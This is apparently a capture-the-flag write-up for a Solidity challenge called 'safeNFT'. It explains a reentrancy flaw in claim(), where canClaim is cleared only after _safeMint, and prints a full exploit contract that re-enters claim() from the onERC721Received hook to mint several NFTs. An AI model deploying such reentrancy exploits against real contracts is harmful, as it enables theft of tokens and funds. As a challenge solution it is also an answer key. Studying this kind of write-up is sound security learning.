### safeNFT

Solution by 2pats

Objective: Claim multiple NFTs for the price of one.

### Main Vulnerabilities:

Target contract's claim() function is susceptible to reentrancy. 

1) _safeMint will trigger the recipient account's onERC721Received custom code if it is a contract

2) the canClaim[address] is only updated AFTER safement is called

```
    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
```

### Exploit:

the contract must: 

- implement a contract that can call the buyNFT() function and the claim() function.
- implement onERC721Received function as per openzeppelin-contracts specification. Make sure it returns the function selector. I chose to manually encode the keccak256 hash of the string literal.
- reenter the claim() function in the onERC721Received hook. I used a simple for loop.

** when doing the reentry exploit make sure to give a generous amount of gas in order to sustain the repeated entries.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "../instances/safeNFT.sol";

contract Solution  {
    uint8 count = 0;
    safeNFT target = safeNFT(0xf0337Cde99638F8087c670c80a57d470134C3AAE);
    function buy() public payable {
        target.buyNFT{value:msg.value}();
    }
    function claim() public {
        target.claim();
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns (bytes4) {
        while (count < 4) {
            count++;
            target.claim();
        }
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
```
